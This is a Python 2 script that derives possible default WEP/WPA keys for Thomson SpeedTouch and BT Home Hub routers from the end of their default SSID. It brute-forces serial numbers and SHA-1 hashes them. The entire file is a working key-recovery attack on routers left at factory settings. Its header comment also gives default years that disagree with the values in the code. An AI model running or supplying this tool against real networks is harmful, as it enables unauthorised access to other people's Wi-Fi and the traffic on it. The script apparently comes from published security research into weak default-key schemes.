#!/usr/bin/python
#
# Python version of stkeys.c by Kevin Devine (see http://weiss.u40.hosting.digiweb.ie/stech/)
# Requires Python 2.5 for hashlib
#
# This script will generate possible WEP/WPA keys for Thomson SpeedTouch / BT Home Hub routers,
# given the last 4 or 6 characters of the default SSID. E.g. For SSID 'SpeedTouchF8A3D0' run:
#
# ./ssid2key.py f8a3d0
#
# By Hubert Seiwert, hubert.seiwert@nccgroup.com 2008-04-17
#
# By default, keys for router serial numbers matching years 2005 to 2007 will be generated.
# If you wish to change this, edit year_list below.

import sys
import hashlib

ssid_end = sys.argv[1].lower()
offset = 40-(len(ssid_end))
charset = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
year_list = [2007,2008]

def ascii2hex(char):
        return hex(ord(char))[2:]

print 'Possible keys for SSID ending %s:' % ssid_end.upper()
count = 0

for year in [y-2000 for y in year_list]:
        for week in range(1,53): #1..52
                #print 'Trying year 200%d week %d' % (year,week)
                for char1 in charset:
                        for char2 in charset:
                                for char3 in charset:
                                        sn = 'CP%02d%02d%s%s%s' % (year,week,ascii2hex(char1),ascii2hex(char2),ascii2hex(char3))
                                        hash = hashlib.sha1(sn.upper()).hexdigest()
                                        if hash[offset:] == ssid_end:
                                                print hash[0:10].upper()
                                                count += 1;
print 'Done. %d possible keys found.' % count

